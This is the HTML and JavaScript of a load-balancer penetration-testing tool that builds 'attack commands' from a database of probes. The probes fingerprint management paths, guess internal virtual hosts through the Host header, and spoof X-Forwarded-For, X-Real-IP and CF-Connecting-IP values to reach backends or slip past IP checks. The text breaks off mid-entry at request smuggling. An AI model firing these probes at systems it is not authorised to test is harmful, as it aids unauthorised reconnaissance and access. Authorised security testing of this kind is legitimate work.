<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Load Balancer Security Testing Suite Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
        
        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        .tech-gradient {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        
        .success-gradient {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
        }
        
        .card-hover {
            transition: all 0.3s ease;
            border: 1px solid #e5e7eb;
        }
        
        .card-hover:hover {
            border-color: #667eea;
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.15);
            transform: translateY(-3px);
        }
        
        .test-selected {
            background: linear-gradient(135deg, #ecfdf5 0%, #f0fdf4 100%);
            border-color: #10b981;
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.15);
        }
        
        .code-output {
            font-family: 'Fira Code', 'Consolas', 'Monaco', monospace;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            line-height: 1.6;
        }
        
        .severity-critical { 
            color: #dc2626; 
            background: linear-gradient(135deg, #fee2e2 0%, #fecaca 100%);
            border-left: 4px solid #dc2626;
        }
        .severity-high { 
            color: #ea580c; 
            background: linear-gradient(135deg, #fed7aa 0%, #fdba74 100%);
            border-left: 4px solid #ea580c;
        }
        .severity-medium { 
            color: #ca8a04; 
            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
            border-left: 4px solid #ca8a04;
        }
        .severity-low { 
            color: #059669; 
            background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);
            border-left: 4px solid #059669;
        }
        
        /* Modern scrollbar */
        ::-webkit-scrollbar { width: 10px; height: 10px; }
        ::-webkit-scrollbar-track { 
            background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%); 
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb { 
            background: linear-gradient(135deg, #cbd5e1 0%, #94a3b8 100%); 
            border-radius: 10px;
            border: 2px solid #f1f5f9;
        }
        ::-webkit-scrollbar-thumb:hover { 
            background: linear-gradient(135deg, #94a3b8 0%, #64748b 100%); 
        }
        
        .loading-spinner {
            border: 3px solid #f3f4f6;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .pulse-glow {
            animation: pulseGlow 2s infinite;
        }
        
        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 5px rgba(102, 126, 234, 0.5); }
            50% { box-shadow: 0 0 20px rgba(102, 126, 234, 0.8); }
        }
        
        .category-card {
            background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            overflow: hidden;
        }
        
        .category-header {
            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
            border-bottom: 1px solid #e2e8f0;
        }
        
        .test-counter {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            font-weight: 600;
            font-size: 0.75rem;
            padding: 0.25rem 0.5rem;
            border-radius: 9999px;
            box-shadow: 0 2px 4px rgba(102, 126, 234, 0.3);
        }
        
        .stat-card {
            background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 1.5rem;
            text-align: center;
            transition: all 0.3s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .btn-primary:hover {
            transform: translateY(-1px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
        }
        
        .search-highlight {
            background-color: #fef3c7;
            padding: 0.125rem 0.25rem;
            border-radius: 0.25rem;
        }
        
        .advanced-filter {
            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
            border: 1px solid #e2e8f0;
            border-radius: 8px;
        }
    </style>
</head>
<body class="bg-gradient-to-br from-slate-50 to-slate-100 text-gray-900 min-h-screen">
    <!-- Header -->
    <header class="bg-white shadow-lg border-b border-gray-200 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-20">
                <div class="flex items-center">
                    <div class="tech-gradient p-3 rounded-xl mr-4">
                        <i class="fas fa-network-wired text-2xl text-white"></i>
                    </div>
                    <div>
                        <h1 class="text-2xl font-bold bg-gradient-to-r from-purple-600 to-blue-600 bg-clip-text text-transparent">
                            Advanced Load Balancer Security Suite Pro
                        </h1>
                        <p class="text-sm text-gray-500 font-medium">Enterprise Penetration Testing Platform</p>
                    </div>
                </div>
                <div class="flex items-center space-x-6">
                    <div class="text-right">
                        <p class="text-lg font-bold text-gray-700">
                            Selected: <span id="selectedCount" class="text-purple-600 font-black">0</span>
                        </p>
                        <p class="text-sm text-gray-500">
                            Total: <span id="totalCount" class="font-semibold">0</span> tests
                        </p>
                    </div>
                    <button onclick="showStats()" class="p-3 bg-gradient-to-r from-green-500 to-green-600 text-white rounded-xl hover:shadow-lg transition-all">
                        <i class="fas fa-chart-bar text-lg"></i>
                    </button>
                    <button onclick="showHelp()" class="p-3 bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-xl hover:shadow-lg transition-all">
                        <i class="fas fa-question-circle text-lg"></i>
                    </button>
                </div>
            </div>
        </div>
    </header>

    <!-- Statistics Dashboard -->
    <div id="statsModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden">
        <div class="flex items-center justify-center min-h-screen p-4">
            <div class="bg-white rounded-2xl shadow-2xl w-full max-w-4xl max-h-[80vh] overflow-hidden">
                <div class="bg-gradient-to-r from-purple-600 to-blue-600 text-white px-6 py-4 flex justify-between items-center">
                    <h3 class="text-xl font-bold">üìä Test Statistics & Analytics</h3>
                    <button onclick="closeStats()" class="text-white hover:text-gray-200">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
                <div class="p-6 overflow-y-auto" style="max-height: 70vh;">
                    <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
                        <div class="stat-card">
                            <div class="text-3xl font-bold text-purple-600" id="totalTestsStat">0</div>
                            <div class="text-sm text-gray-600">Total Tests</div>
                        </div>
                        <div class="stat-card">
                            <div class="text-3xl font-bold text-red-600" id="criticalTestsStat">0</div>
                            <div class="text-sm text-gray-600">Critical</div>
                        </div>
                        <div class="stat-card">
                            <div class="text-3xl font-bold text-orange-600" id="highTestsStat">0</div>
                            <div class="text-sm text-gray-600">High</div>
                        </div>
                        <div class="stat-card">
                            <div class="text-3xl font-bold text-blue-600" id="categoriesStat">0</div>
                            <div class="text-sm text-gray-600">Categories</div>
                        </div>
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="bg-white p-4 rounded-xl border">
                            <h4 class="font-semibold mb-4">Severity Distribution</h4>
                            <canvas id="severityChart" width="300" height="200"></canvas>
                        </div>
                        <div class="bg-white p-4 rounded-xl border">
                            <h4 class="font-semibold mb-4">Category Distribution</h4>
                            <canvas id="categoryChart" width="300" height="200"></canvas>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Quick Actions & Presets -->
    <div class="bg-white shadow-sm border-b border-gray-200">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
            <div class="flex flex-wrap gap-3 items-center justify-between">
                <div class="flex flex-wrap gap-2">
                    <button onclick="selectPreset('fingerprint')" class="px-4 py-2 bg-gradient-to-r from-indigo-500 to-indigo-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-fingerprint mr-2"></i>Fingerprinting
                    </button>
                    <button onclick="selectPreset('vhost')" class="px-4 py-2 bg-gradient-to-r from-purple-500 to-purple-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-server mr-2"></i>Virtual Hosts
                    </button>
                    <button onclick="selectPreset('backend')" class="px-4 py-2 bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-network-wired mr-2"></i>Backend Enum
                    </button>
                    <button onclick="selectPreset('critical')" class="px-4 py-2 bg-gradient-to-r from-red-500 to-red-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-exclamation-triangle mr-2"></i>Critical CVEs
                    </button>
                    <button onclick="selectPreset('smuggling')" class="px-4 py-2 bg-gradient-to-r from-orange-500 to-orange-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-user-ninja mr-2"></i>Smuggling
                    </button>
                    <button onclick="selectPreset('bypass')" class="px-4 py-2 bg-gradient-to-r from-green-500 to-green-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-unlock mr-2"></i>Auth Bypass
                    </button>
                    <button onclick="selectPreset('comprehensive')" class="px-4 py-2 bg-gradient-to-r from-gray-700 to-gray-800 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-shield-check mr-2"></i>Full Suite
                    </button>
                </div>
                <div class="flex gap-3">
                    <button onclick="selectAll()" class="px-4 py-2 text-gray-700 bg-gray-100 hover:bg-gray-200 rounded-lg transition text-sm font-semibold">
                        <i class="fas fa-check-square mr-2"></i>Select All
                    </button>
                    <button onclick="clearAll()" class="px-4 py-2 text-gray-700 bg-gray-100 hover:bg-gray-200 rounded-lg transition text-sm font-semibold">
                        <i class="fas fa-times mr-2"></i>Clear All
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <!-- Configuration Panel -->
        <div class="bg-white rounded-2xl shadow-xl border border-gray-200 mb-8 overflow-hidden">
            <div class="tech-gradient px-6 py-4">
                <h2 class="text-xl font-bold text-white flex items-center">
                    <i class="fas fa-cog text-white mr-3"></i>Configuration & Settings
                </h2>
            </div>
            <div class="p-6">
                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                    <div>
                        <label class="block text-sm font-bold text-gray-700 mb-2">üéØ Target URL</label>
                        <input type="text" id="targetUrl" value="https://target.example.com" 
                               class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all">
                    </div>
                    <div>
                        <label class="block text-sm font-bold text-gray-700 mb-2">üîó Proxy (Optional)</label>
                        <input type="text" id="proxyUrl" placeholder="http://127.0.0.1:8080" 
                               class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all">
                    </div>
                    <div>
                        <label class="block text-sm font-bold text-gray-700 mb-2">üìÑ Output Format</label>
                        <select id="outputFormat" class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all">
                            <option value="curl-pure">üî• Pure cURL</option>
                            <option value="python">üêç Python Script</option>
                            <option value="python-async">‚ö° Python Async</option>
                            <option value="burp">üîß Burp Suite</option>
                            <option value="bash">üìú Bash Script</option>
                            <option value="powershell">üíª PowerShell</option>
                            <option value="nuclei">üéØ Nuclei Templates</option>
                            <option value="raw">üìù Raw HTTP</option>
                        </select>
                    </div>
                </div>
            </div>
        </div>

        <!-- Advanced Search and Filter -->
        <div class="bg-white rounded-2xl shadow-xl border border-gray-200 mb-8 overflow-hidden">
            <div class="bg-gradient-to-r from-blue-500 to-blue-600 px-6 py-4">
                <h2 class="text-xl font-bold text-white flex items-center">
                    <i class="fas fa-filter text-white mr-3"></i>Advanced Search & Filtering
                </h2>
            </div>
            <div class="p-6">
                <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
                    <div class="md:col-span-2">
                        <div class="relative">
                            <i class="fas fa-search absolute left-4 top-4 text-gray-400 text-lg"></i>
                            <input type="text" id="searchBox" placeholder="Search attacks, CVEs, techniques..." 
                                   onkeyup="filterTests()"
                                   class="w-full pl-12 pr-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
                        </div>
                    </div>
                    <div>
                        <select id="categoryFilter" onchange="filterTests()" 
                                class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
                            <option value="">üóÇÔ∏è All Categories</option>
                        </select>
                    </div>
                    <div>
                        <select id="severityFilter" onchange="filterTests()"
                                class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
                            <option value="">‚ö° All Severities</option>
                            <option value="critical">üî¥ Critical</option>
                            <option value="high">üü† High</option>
                            <option value="medium">üü° Medium</option>
                            <option value="low">üü¢ Low</option>
                        </select>
                    </div>
                </div>
                <div class="mt-4 flex flex-wrap gap-2" id="activeFilters">
                    <!-- Active filters will be shown here -->
                </div>
            </div>
        </div>

        <!-- Test Categories -->
        <div id="testContainer" class="space-y-6">
            <!-- Categories will be inserted here -->
        </div>

        <!-- Generate Button -->
        <div class="fixed bottom-8 right-8">
            <button onclick="generateCommands()" 
                    class="bg-gradient-to-r from-purple-600 to-blue-600 text-white px-8 py-4 rounded-2xl shadow-2xl hover:shadow-3xl transition-all duration-300 flex items-center font-bold text-lg pulse-glow">
                <i class="fas fa-terminal mr-3 text-xl"></i>Generate Commands
                <span id="selectedBadge" class="ml-3 bg-white text-purple-600 px-3 py-1 rounded-full text-sm font-black">0</span>
            </button>
        </div>
    </main>

    <!-- Output Modal -->
    <div id="outputModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden">
        <div class="flex items-center justify-center min-h-screen p-4">
            <div class="bg-white rounded-2xl shadow-2xl w-full max-w-6xl max-h-[90vh] overflow-hidden">
                <div class="bg-gradient-to-r from-purple-600 to-blue-600 text-white px-6 py-4 flex justify-between items-center">
                    <h3 class="text-xl font-bold">üöÄ Generated Attack Commands</h3>
                    <div class="flex gap-3">
                        <button onclick="copyCommands()" class="px-4 py-2 bg-white bg-opacity-20 text-white rounded-lg hover:bg-opacity-30 transition text-sm font-semibold">
                            <i class="fas fa-copy mr-2"></i>Copy All
                        </button>
                        <button onclick="downloadCommands()" class="px-4 py-2 bg-white bg-opacity-20 text-white rounded-lg hover:bg-opacity-30 transition text-sm font-semibold">
                            <i class="fas fa-download mr-2"></i>Download
                        </button>
                        <button onclick="closeModal()" class="text-white hover:text-gray-200">
                            <i class="fas fa-times text-xl"></i>
                        </button>
                    </div>
                </div>
                <div class="p-6 overflow-y-auto" style="max-height: 75vh;">
                    <pre id="outputContent" class="code-output p-6 rounded-xl text-sm overflow-x-auto"></pre>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Comprehensive Load Balancer Security Test Database - 200+ Tests
const testDatabase = {
    "Load Balancer Fingerprinting": {
        icon: "fa-fingerprint",
        tests: [
            {
                name: "F5 BIG-IP Detection via Error Pages",
                description: "Detect F5 BIG-IP via characteristic error responses and headers",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/tmui/login.jsp"
            },
            {
                name: "F5 BIG-IP iControl Detection",
                description: "Detect F5 BIG-IP iControl management interface",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/mgmt/shared/authn/login"
            },
            {
                name: "HAProxy Detection via Stats",
                description: "Identify HAProxy via statistics endpoint",
                method: "GET", 
                headers: {},
                severity: "low",
                path: "/haproxy?stats"
            },
            {
                name: "HAProxy Error Page Detection",
                description: "Detect HAProxy via characteristic error pages",
                method: "GET", 
                headers: {},
                severity: "low",
                path: "/nonexistent-path-for-error"
            },
            {
                name: "Nginx Load Balancer Detection",
                description: "Detect Nginx as load balancer via headers and responses",
                method: "GET",
                headers: {"Accept-Encoding": "gzip, deflate"},
                severity: "low",
                path: "/"
            },
            {
                name: "Nginx Status Module Detection",
                description: "Check for Nginx status module exposure",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/nginx_status"
            },
            {
                name: "Apache mod_proxy Detection",
                description: "Detect Apache with mod_proxy_balancer",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/balancer-manager"
            },
            {
                name: "Apache Server Status Detection",
                description: "Check for Apache server-status page",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/server-status"
            },
            {
                name: "AWS ALB Detection",
                description: "Identify AWS Application Load Balancer via headers",
                method: "GET",
                headers: {"X-Amzn-Trace-Id": "Root=1-test"},
                severity: "low",
                path: "/"
            },
            {
                name: "AWS ALB Target Health",
                description: "Check AWS ALB target health endpoint",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/health"
            },
            {
                name: "CloudFlare Detection",
                description: "Detect CloudFlare load balancer and configuration",
                method: "GET",
                headers: {"CF-RAY": "test", "CF-Connecting-IP": "1.1.1.1"},
                severity: "low",
                path: "/"
            },
            {
                name: "CloudFlare Origin Exposure",
                description: "Attempt to expose CloudFlare origin server",
                method: "GET",
                headers: {"CF-Connecting-IP": "127.0.0.1"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Azure Front Door Detection",
                description: "Identify Azure Front Door service",
                method: "GET",
                headers: {"X-Azure-FDID": "test", "X-Azure-SocketIP": "1.1.1.1"},
                severity: "low",
                path: "/"
            },
            {
                name: "Azure Application Gateway Detection",
                description: "Detect Azure Application Gateway",
                method: "GET",
                headers: {"X-Azure-RequestId": "test"},
                severity: "low",
                path: "/"
            },
            {
                name: "Kemp LoadMaster Detection",
                description: "Detect Kemp LoadMaster via management interface",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/access/ntlm"
            },
            {
                name: "Kemp LoadMaster Version Detection",
                description: "Detect Kemp LoadMaster version information",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/access/geo"
            },
            {
                name: "Citrix NetScaler Detection",
                description: "Identify Citrix NetScaler ADC",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/netscaler"
            },
            {
                name: "Citrix ADC NITRO API Detection",
                description: "Check for Citrix ADC NITRO API exposure",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/nitro/v1/config"
            },
            {
                name: "A10 Networks Detection",
                description: "Detect A10 Networks Thunder ADC",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/adminGui"
            },
            {
                name: "Barracuda Load Balancer Detection",
                description: "Identify Barracuda Load Balancer ADC",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/cgi-mod/index.cgi"
            },
            {
                name: "Radware Alteon Detection",
                description: "Detect Radware Alteon load balancer",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/config/dump"
            },
            {
                name: "pfSense Detection",
                description: "Detect pfSense firewall/load balancer",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/index.php"
            }
        ]
    },
    "Virtual Host Discovery": {
        icon: "fa-server",
        tests: [
            {
                name: "Admin VHost Discovery",
                description: "Attempt to access admin virtual host",
                method: "GET",
                headers: {"Host": "admin.TARGET"},
                severity: "high",
                path: "/"
            },
            {
                name: "Administrator VHost Discovery",
                description: "Try administrator virtual host",
                method: "GET",
                headers: {"Host": "administrator.TARGET"},
                severity: "high",
                path: "/"
            },
            {
                name: "Internal VHost Discovery",
                description: "Try to access internal virtual host",
                method: "GET",
                headers: {"Host": "internal.TARGET"},
                severity: "high",
                path: "/"
            },
            {
                name: "Private VHost Discovery",
                description: "Access private virtual host",
                method: "GET",
                headers: {"Host": "private.TARGET"},
                severity: "high",
                path: "/"
            },
            {
                name: "API VHost Discovery",
                description: "Discover API virtual host",
                method: "GET",
                headers: {"Host": "api.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "API v1 VHost Discovery",
                description: "Discover API version 1 virtual host",
                method: "GET",
                headers: {"Host": "api-v1.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Staging VHost Discovery",
                description: "Access staging environment",
                method: "GET",
                headers: {"Host": "staging.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Staging API VHost Discovery",
                description: "Access staging API environment",
                method: "GET",
                headers: {"Host": "staging-api.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Dev VHost Discovery",
                description: "Access development environment",
                method: "GET",
                headers: {"Host": "dev.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Development VHost Discovery",
                description: "Access development environment (long form)",
                method: "GET",
                headers: {"Host": "development.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Test VHost Discovery",
                description: "Access test environment",
                method: "GET",
                headers: {"Host": "test.TARGET"},
                severity: "low",
                path: "/"
            },
            {
                name: "Testing VHost Discovery",
                description: "Access testing environment",
                method: "GET",
                headers: {"Host": "testing.TARGET"},
                severity: "low",
                path: "/"
            },
            {
                name: "QA VHost Discovery",
                description: "Access QA environment",
                method: "GET",
                headers: {"Host": "qa.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "UAT VHost Discovery",
                description: "Access User Acceptance Testing environment",
                method: "GET",
                headers: {"Host": "uat.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Management VHost Discovery",
                description: "Access management interface",
                method: "GET",
                headers: {"Host": "mgmt.TARGET"},
                severity: "high",
                path: "/"
            },
            {
                name: "Manage VHost Discovery",
                description: "Access manage interface",
                method: "GET",
                headers: {"Host": "manage.TARGET"},
                severity: "high",
                path: "/"
            },
            {
                name: "Monitor VHost Discovery",
                description: "Access monitoring interface",
                method: "GET",
                headers: {"Host": "monitor.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Monitoring VHost Discovery",
                description: "Access monitoring interface (long form)",
                method: "GET",
                headers: {"Host": "monitoring.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Stats VHost Discovery",
                description: "Access statistics interface",
                method: "GET",
                headers: {"Host": "stats.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Status VHost Discovery",
                description: "Access status interface",
                method: "GET",
                headers: {"Host": "status.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Load Balancer VHost",
                description: "Access load balancer itself",
                method: "GET",
                headers: {"Host": "lb.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "LoadBalancer VHost",
                description: "Access load balancer (long form)",
                method: "GET",
                headers: {"Host": "loadbalancer.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Backend VHost Discovery",
                description: "Access backend servers directly",
                method: "GET",
                headers: {"Host": "backend.TARGET"},
                severity: "high",
                path: "/"
            },
            {
                name: "Database VHost Discovery",
                description: "Attempt database interface access",
                method: "GET",
                headers: {"Host": "db.TARGET"},
                severity: "high",
                path: "/"
            },
            {
                name: "Cache VHost Discovery",
                description: "Access cache interface",
                method: "GET",
                headers: {"Host": "cache.TARGET"},
                severity: "medium",
                path: "/"
            },
            {
                name: "CDN VHost Discovery",
                description: "Access CDN endpoint",
                method: "GET",
                headers: {"Host": "cdn.TARGET"},
                severity: "low",
                path: "/"
            },
            {
                name: "Media VHost Discovery",
                description: "Access media server",
                method: "GET",
                headers: {"Host": "media.TARGET"},
                severity: "low",
                path: "/"
            },
            {
                name: "Static VHost Discovery",
                description: "Access static content server",
                method: "GET",
                headers: {"Host": "static.TARGET"},
                severity: "low",
                path: "/"
            },
            {
                name: "Images VHost Discovery",
                description: "Access images server",
                method: "GET",
                headers: {"Host": "images.TARGET"},
                severity: "low",
                path: "/"
            },
            {
                name: "Assets VHost Discovery",
                description: "Access assets server",
                method: "GET",
                headers: {"Host": "assets.TARGET"},
                severity: "low",
                path: "/"
            },
            {
                name: "Wildcard VHost Test",
                description: "Test wildcard virtual host configuration",
                method: "GET",
                headers: {"Host": "*.TARGET"},
                severity: "low",
                path: "/"
            },
            {
                name: "Numeric VHost Test",
                description: "Test numeric subdomain access",
                method: "GET",
                headers: {"Host": "1.TARGET"},
                severity: "low",
                path: "/"
            },
            {
                name: "IPv4 Host Header Test",
                description: "Test IPv4 address in Host header",
                method: "GET",
                headers: {"Host": "192.168.1.1"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Localhost VHost Test",
                description: "Test localhost in Host header",
                method: "GET",
                headers: {"Host": "localhost"},
                severity: "medium",
                path: "/"
            }
        ]
    },
    "Backend Server Enumeration": {
        icon: "fa-network-wired",
        tests: [
            {
                name: "Backend IP Enumeration via X-Forwarded-For",
                description: "Enumerate backend servers using X-Forwarded-For header",
                method: "GET",
                headers: {"X-Forwarded-For": "192.168.1.100"},
                severity: "high",
                path: "/"
            },
            {
                name: "Backend IP Range Scan",
                description: "Scan common backend IP ranges",
                method: "GET",
                headers: {"X-Forwarded-For": "10.0.0.100"},
                severity: "high",
                path: "/"
            },
            {
                name: "Backend Discovery via X-Real-IP",
                description: "Discover backend servers via X-Real-IP manipulation",
                method: "GET",
                headers: {"X-Real-IP": "172.16.0.100"},
                severity: "high",
                path: "/"
            },
            {
                name: "Internal Network Scan Class A",
                description: "Scan Class A internal network",
                method: "GET",
                headers: {"X-Forwarded-For": "10.1.1.1", "X-Client-IP": "10.1.1.1"},
                severity: "high",
                path: "/"
            },
            {
                name: "Internal Network Scan Class B",
                description: "Scan Class B internal network",
                method: "GET",
                headers: {"X-Forwarded-For": "172.16.1.1", "X-Client-IP": "172.16.1.1"},
                severity: "high",
                path: "/"
            },
            {
                name: "Internal Network Scan Class C",
                description: "Scan Class C internal network",
                method: "GET",
                headers: {"X-Forwarded-For": "192.168.1.1", "X-Client-IP": "192.168.1.1"},
                severity: "high",
                path: "/"
            },
            {
                name: "Backend Port Enumeration 8080",
                description: "Enumerate backend server on port 8080",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1:8080"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Backend Port Enumeration 8443",
                description: "Enumerate backend server on port 8443",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1:8443"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Backend Port Enumeration 9000",
                description: "Enumerate backend server on port 9000",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1:9000"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Session Affinity Backend Discovery",
                description: "Discover backends through session cookies",
                method: "GET",
                headers: {"Cookie": "SERVERID=backend-1"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Session Cookie Backend Enumeration",
                description: "Enumerate backends via session cookie manipulation",
                method: "GET",
                headers: {"Cookie": "JSESSIONID=server1.app1"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Load Balancer Algorithm Detection",
                description: "Detect load balancing algorithm in use",
                method: "GET",
                headers: {"Connection": "keep-alive"},
                severity: "low",
                path: "/"
            },
            {
                name: "Round Robin Detection",
                description: "Detect round-robin load balancing",
                method: "GET",
                headers: {"Cache-Control": "no-cache"},
                severity: "low",
                path: "/"
            },
            {
                name: "Backend Technology Stack Detection",
                description: "Identify backend server technology",
                method: "GET",
                headers: {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                severity: "low",
                path: "/"
            },
            {
                name: "Backend Health Check Endpoint",
                description: "Discover backend health check endpoints",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/health"
            },
            {
                name: "Backend Healthz Endpoint",
                description: "Discover Kubernetes-style health endpoint",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/healthz"
            },
            {
                name: "Backend Ready Endpoint",
                description: "Discover readiness probe endpoint",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/ready"
            },
            {
                name: "Backend Alive Endpoint",
                description: "Discover liveness probe endpoint",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/alive"
            },
            {
                name: "Backend Status Page Discovery",
                description: "Find backend server status pages",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/status"
            },
            {
                name: "Backend Metrics Endpoint",
                description: "Discover backend metrics endpoint",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/metrics"
            },
            {
                name: "Backend Info Endpoint",
                description: "Discover backend info endpoint",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/info"
            },
            {
                name: "Backend Version Endpoint",
                description: "Discover backend version information",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/version"
            },
            {
                name: "Internal Service Discovery",
                description: "Discover internal services via headers",
                method: "GET",
                headers: {"X-Forwarded-Proto": "http", "X-Forwarded-Port": "8080"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Backend Service Mesh Detection",
                description: "Detect service mesh backend communication",
                method: "GET",
                headers: {"X-Envoy-Internal": "true"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Kubernetes Service Discovery",
                description: "Discover Kubernetes services",
                method: "GET",
                headers: {"X-Kubernetes-Service": "backend"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Docker Container Discovery",
                description: "Discover Docker containerized backends",
                method: "GET",
                headers: {"X-Container-Name": "backend"},
                severity: "medium",
                path: "/"
            }
        ]
    },
    "Request Smuggling": {
        icon: "fa-user-ninja",
        tests: [
            {
                name: "CL.TE Request Smuggling Basic",
